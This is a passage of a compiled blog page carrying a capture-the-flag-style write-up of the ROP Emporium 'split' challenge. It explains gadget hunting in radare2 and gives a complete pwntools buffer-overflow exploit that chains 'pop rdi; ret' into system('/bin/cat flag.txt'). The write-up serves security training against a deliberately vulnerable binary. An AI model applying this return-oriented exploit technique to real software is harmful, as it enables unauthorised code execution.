operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000007e8\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x004007e8\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"21\"}),\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"22\"}),`   .rodata ascii split by ROP Emporium\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000007fe\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x004007fe\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"7\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),`    .rodata ascii x86_64\\\\n\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000806\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00400806\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"9\"}),`    .rodata ascii \\\\nExiting\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000810\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00400810\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"43\"}),\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"44\"}),`   .rodata ascii Contriving a reason to ask user for data...\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"4\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000083f\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0040083f\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"10\"}),\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"11\"}),\"   .rodata ascii Thank you\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"!\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000084a\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0040084a\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"7\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),\"    .rodata ascii \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),\"bin\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),`ls\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00001060\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00601060\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"17\"}),\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"18\"}),\"   .data   ascii \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),\"bin\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),`cat flag.txt\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`})]})}),(0,e.jsxs)(n.p,{children:[\"We have an important string \",(0,e.jsx)(n.strong,{children:'\"/bin/cat flag.txt\"'}),\" which will enable us to complete our goal. Now we need pass the string to system function as follows \",(0,e.jsx)(n.strong,{children:\"system('/bin/cat flag.txt')\"}),\".\"]}),(0,e.jsxs)(n.p,{children:[\"For building ropchain, we need to understand the calling conventions of \",(0,e.jsx)(n.strong,{children:\"AMD64 ABI\"}),\".The calling convention passes the arguments to the registers in the following order \",(0,e.jsx)(n.strong,{children:\"RDI, RSI, RDX, RCX, R8 and R9\"}),\".\"]}),(0,e.jsxs)(n.p,{children:[\"Because the system function receives one argument, we need to look for one gadgets that we control the \",(0,e.jsx)(n.strong,{children:\"rdi\"}),\" address.\"]}),(0,e.jsxs)(n.p,{children:[(0,e.jsx)(n.strong,{children:\"What are gadgets?\"}),\" Gadgets are sequence of instructions the end with ret instruction. Because we want to load a value into rdi register, we look for a pop \",(0,e.jsx)(n.strong,{children:\"pop rdi; ret\"}),\" instruction in order to pass an argument to the system function.\"]}),(0,e.jsxs)(n.p,{children:[\"For searching gadget in radare2/rizin, use \",(0,e.jsx)(n.strong,{children:\"/R\"}),\" command as shown in the image below.\"]}),(0,e.jsx)(n.div,{children:(0,e.jsx)(c,{alt:\"\",src:\"/static/images/ropemporium/split_poprdi.png\",width:\"726\",height:\"95\"})}),(0,e.jsx)(n.div,{children:(0,e.jsx)(c,{alt:\"ropchain\",src:\"/static/images/ropemporium/popgadget.png\",width:\"211\",height:\"366\"})}),(0,e.jsxs)(n.p,{children:[\"The goal is to overwrite the return address with the address of \",(0,e.jsx)(n.strong,{children:'\"pop rdi, ret \"'}),\" and then call system function. we need to fill the buffer memory with 32bytes, 8 bytes more to overwrite the rbp address and 8 bytes teo overwrite the return address with pop rdi address.\"]}),(0,e.jsxs)(n.h2,{id:\"exploit\",children:[(0,e.jsx)(n.a,{href:\"#exploit\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Exploit\"]}),(0,e.jsx)(n.p,{children:\"Full exploit of split challenge is;\"}),(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-python\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` pwn\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"context\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"encoding \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"latin-1\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"warnings\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"simplefilter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"ignore\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"context\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"arch \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"amd64\"'}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"io \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"process\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"./split\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"system_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400560\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"   \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"#address of system\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pop_rdi_ret \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x004007c3\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"  \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# pop rdi; ret gadget\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"bin_cat_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00601060\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"  \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"#bin cat flag.txt address\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'b\"A\"'}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"32\"}),\"  \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"#fill the buffer\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'b\"B\"'}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),\"   \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# overwrite  rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" pop_rdi_ret \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# pop rdi gadget\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" bin_cat_addr \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# argument passed to the system function\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" system_addr   \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"#call system\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"io\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"writeafter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'>'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"info\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"io\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"clean\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"decode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),(0,e.jsx)(n.p,{children:\"Running the above code we get a flag.\"}),(0,e.jsx)(n.div,{children:(0,e.jsx)(c,{alt:\"\",src:\"/static/images/ropemporium/split_flag.png\",width:\"755\",height:\"95\"})}),(0,e.jsx)(n.blockquote,{children:(0,e.jsx)(n.p,{children:(0,e.jsx)(n.strong,{children:\"To avoid the segmentation fault of the above, we can overwrite the rbp address with exit function address in order to exit without segfault.\"})})})]})}}var w=x;function v(a,s){throw new Error(\"Expected \"+(s?\"component\":\"object\")+\" `\"+a+\"` to be defined: you likely forgot to import, pass, or provide it.\")}return g(y);})();\n;return Component;","toc":[{"value":"Introduction","url":"#introduction","depth":2},{"value":"Exploit","url":"#exploit","depth":2}],"frontMatter":{"readingTime":{"text":"8 min read","minutes":7.645,"time":458700,"words":1529},"slug":"ropemporium-split","fileName":"ropemporium-split.mdx","title":"Return-Oriented Programming - Split","date":"2021-12-20","tags":["ropemporium","rop","pwn"],"draft":false,"summary":"Combine elements from the ret2win challenge that have been split apart to beat this challenge. Learn how to use another tool whilst crafting a short ROP chain.","layout":"PostLayout","images":"/static/images/ropemporium/split.jpg","canonicalUrl":null}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.53,"time":31800,"words":106},"slug":["default"],"fileName":"default.md","name":"Thuri","avatar":"/static/images/profile.png","occupation":"Software Developer","email":"thuri783@gmail.com","github":"https://github.com/thuri10"}],"prev":{"title":"Return-Oriented Programming - Write4","date":"2021-12-20T00:00:00.000Z","tags":["ropemporium","rop","pwn"],"draft":false,"summary":"Find and manipulate gadgets to construct an arbitrary write primitive, then use it to learn where and how to get your data into process memory.","layout":"PostLayout","images":"/static/images/ropemporium/write4.jpg","canonicalUrl":null,"slug":"ropemporium-write4"},"next":{"title":"Return-Oriented Programming - ret2win","date":"2021-12-20T00:00:00.000Z","tags":["ropemporium","rop","pwn"],"draft":false,"summary":"ret2win means return here to win and it's recommended you start with this challenge. Visit the challenge page by clicking this card to learn more.","images":"/static/images/ropemporium/ret2win.jpg","layout":"PostLayout","slug":"ropemporium-ret2win"}},"__N_SSG":true}